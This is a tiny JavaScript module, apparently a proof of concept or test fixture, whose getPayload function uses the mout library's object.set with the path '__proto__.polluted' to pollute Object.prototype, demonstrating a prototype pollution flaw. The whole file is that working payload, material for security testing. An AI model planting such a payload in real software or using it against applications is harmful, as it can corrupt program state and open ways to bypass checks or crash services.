function getPayload() {
    var mout = require("mout");
    var obj = {};

    mout.object.set(obj, "__proto__.polluted", "yes");

    return { obj };
}

module.exports = { getPayload };